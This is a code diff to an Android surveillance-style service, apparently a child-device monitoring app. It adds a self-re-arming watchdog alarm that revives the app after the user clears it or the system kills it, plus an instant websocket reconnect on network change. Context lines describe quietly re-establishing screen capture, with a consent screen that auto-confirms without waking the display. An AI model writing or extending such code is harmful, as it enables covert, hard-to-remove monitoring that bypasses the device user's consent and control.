@@ -11,6 +11,8 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
+import android.net.ConnectivityManager
+import android.net.Network
 import android.os.BatteryManager
 import android.os.IBinder
 import android.os.SystemClock
@@ -36,6 +38,9 @@ import kotlinx.coroutines.launch
 class MainService : Service() {
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
+
+    /** Internet wapas aane par ws ko turant jodne wala callback (unregister onDestroy me). */
+    private var netCb: ConnectivityManager.NetworkCallback? = null
 
     companion object {
         /** True while the foreground service is alive; used by the SelfHeal watchdog. */
@@ -79,6 +84,25 @@ class MainService : Service() {
         }
 
         WsChild.connect()
+
+        // Self-re-arming 2-min watchdog alarm — recent-clear / OEM kill ke baad
+        // bhi app khud uth jati hai (alarm system-side hota hai, process ke
+        // marne par bhi zinda rehta hai).
+        SelfHeal.scheduleWatchdog(this)
+
+        // WiFi <-> mobile data switch ya internet drop wapas aane par turant
+        // reconnect — backoff loop ka wait nahi. Half-open link WsChild ke
+        // pingInterval se pakda jata hai; ye callback healthy-network case hai.
+        runCatching {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val cb = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    WsChild.connect()
+                }
+            }
+            cm.registerDefaultNetworkCallback(cb)
+            netCb = cb
+        }
 
         // One-shot per boot/process: quietly re-establish the screen-capture session
         // (ConsentActivity auto-confirms it without waking the screen). This is what
@@ -134,6 +158,12 @@ class MainService : Service() {
 
     override fun onDestroy() {
         running = false
+        runCatching {
+            netCb?.let {
+                (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it)
+            }
+        }
+        netCb = null
         WsChild.disconnect()
         // Self-heal: if the system (or the child) killed this service while still
         // paired and not released, schedule an automatic restart 3 s from now.
